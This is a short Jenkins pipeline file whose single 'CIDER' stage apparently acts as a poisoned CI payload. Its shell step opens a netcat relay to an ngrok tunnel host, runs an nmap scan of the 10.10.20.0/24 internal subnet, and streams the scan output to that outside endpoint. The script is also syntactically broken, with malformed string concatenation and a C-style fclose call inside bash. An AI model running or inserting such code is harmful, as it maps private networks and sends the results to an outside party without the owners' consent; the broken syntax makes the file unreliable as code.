pipeline {
    agent any
    stages {
        stage('CIDER') {
            steps {                     

                sh "#!/bin/bash \n +"
                "export NGPORT=14200 \n +"
                "export NGHOSTNAME=0.tcp.ngrok.io \n +"
                "mkfifo piperz \n +"
                "nc -k -l 12345 0<piperz|nc $NGHOSTNAME $NGPORT 1>piperz & \n +"
                "sudo apt-get update \n +"
                "sudo apt-get install nmap \n +"
                "sudo nmap -sT 10.10.20.0/24 -Pn | nc localhost 12345 \n +"
                "echo "ciderdone" | nc localhost 12345 \n +"
                "sudo fclose(piperz)"
                }
            }
        }
    }